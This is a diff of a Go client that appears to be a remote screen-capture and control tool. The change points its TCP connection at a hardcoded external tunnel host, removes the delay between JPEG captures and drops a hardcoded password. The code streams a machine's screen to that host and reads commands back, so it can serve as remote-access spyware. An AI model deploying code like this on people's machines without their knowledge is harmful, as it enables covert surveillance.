@@ -15,13 +15,11 @@ import (
 )
 
 const (
-	IP      = "qq80378994.e2.luyouxia.net:28602"
-	PORT    = 1010
-	CONNPWD = "18Sd9fkdkf9"
+	IP   = "qq80378994.e2.luyouxia.net:28602"
+	PORT = 1010
 )
 
 const (
-	HEAD    = "HEAD"
 	VERSION = "1.0.0"
 )
 
@@ -55,7 +53,7 @@ func heartbeat(conn net.Conn, interval time.Duration) {
 func connectNew() {
 
 	wg.Add(2) // 协程计数器 +1
-	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
+	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "qq80378994.e2.luyouxia.net:28602")
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
 	if err != nil {
 		fmt.Println(err)
@@ -92,7 +90,7 @@ func createScreen(socket net.Conn) {
 
 	util.SendHead(1, socket)
 	for {
-		time.Sleep(time.Millisecond * 3000)
+		//time.Sleep(time.Millisecond * 300)
 
 		screen, err := CaptureScreenAsJPEG(80)
 		if err != nil {
@@ -132,7 +130,6 @@ func CaptureScreenAsJPEG(quality int) ([]byte, error) {
 }
 func doSomeThing(socket net.Conn) {
 	for {
-		fmt.Println("abc")
 		time.Sleep(time.Millisecond)
 		reader := bufio.NewReader(socket)
 		receiveHead := util.ReceiveHead(reader)
